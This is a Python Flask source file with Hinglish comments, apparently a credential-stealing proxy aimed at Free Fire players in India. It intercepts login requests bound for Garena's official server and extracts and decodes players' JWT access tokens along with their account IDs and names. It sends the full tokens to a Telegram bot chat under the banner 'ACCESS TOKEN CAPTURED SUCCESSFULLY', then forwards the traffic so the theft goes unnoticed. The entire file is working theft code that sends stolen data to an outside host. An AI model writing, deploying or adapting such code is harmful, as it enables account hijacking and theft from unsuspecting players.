import os
import base64
import json
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# Tera Telegram Bot Token
TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

# Garena ka official game server (IND Region ke liye)
TARGET_SERVER = "https://client.ind.freefiremobile.com"

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        payload_encoded = parts[1]
        payload_encoded += '=' * (-len(payload_encoded) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_encoded)
        return json.loads(decoded_bytes.decode('utf-8'))
    except Exception as e:
        return None

@app.route('/', defaults={'subpath': ''}, methods=['GET', 'POST', 'PUT', 'DELETE'])
@app.route('/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(subpath):
    try:
        # 1. Token capture aur Telegram par bhejne ka logic
        auth_header = request.headers.get('Authorization') or request.args.get('auth')
        chat_id = request.args.get('chat_id')

        if not auth_header and request.is_json:
            req_data = request.get_json()
            auth_header = req_data.get('Authorization') or req_data.get('token')

        if auth_header and ('GetLoginData' in subpath or auth_header.startswith("Bearer")):
            jwt_token = auth_header.split(" ")[1] if auth_header.startswith("Bearer ") else auth_header
            jwt_data = decode_jwt_payload(jwt_token)
            
            if jwt_data:
                account_id = jwt_data.get("account_id")
                encoded_nickname = jwt_data.get("nickname")
                region = jwt_data.get("lock_region", "IND")
                open_id = jwt_data.get("external_id")
                
                try:
                    nickname = base64.b64decode(encoded_nickname).decode('utf-8') if encoded_nickname else "Unknown"
                except:
                    nickname = encoded_nickname

                if chat_id:
                    msg_text = (
                        f"🔑 *ACCESS TOKEN CAPTURED SUCCESSFULLY*!!\n\n"
                        f"👤 *ACCOUNT ID*\n`{account_id}`\n\n"
                        f"🎮 *PLAYER NAME*\n`{nickname}`\n\n"
                        f"🌍 *REGION*\n`{region}`\n\n"
                        f"🎟️ *ACCESS TOKEN*\n`{jwt_token}`\n\n"
                        f"🆔 *OPEN ID*\n`{open_id}`"
                    )
                    requests.post(TELEGRAM_API_URL, json={
                        "chat_id": chat_id,
                        "text": msg_text,
                        "parse_mode": "Markdown"
                    })

        # 2. Request ko Garena ke official server par forward karna
        target_url = f"{TARGET_SERVER}/{subpath}"
        if request.query_string:
            target_url += f"?{request.query_string.decode('utf-8')}"

        # Headers ko forward karna (Host change karke)
        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
        headers['Host'] = 'client.ind.freefiremobile.com'

        # Official server ko request bhejna
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=False,
            timeout=30
        )

        # Official server ka response wapas game client ko dena
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        response_headers = [(name, value) for name, value in resp.raw.headers.items() if name.lower() not in excluded_headers]

        return Response(resp.content, resp.status_code, response_headers)

    except Exception as e:
        print(f"Proxy Error: {e}")
        return jsonify({"status": 1, "msg": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
    
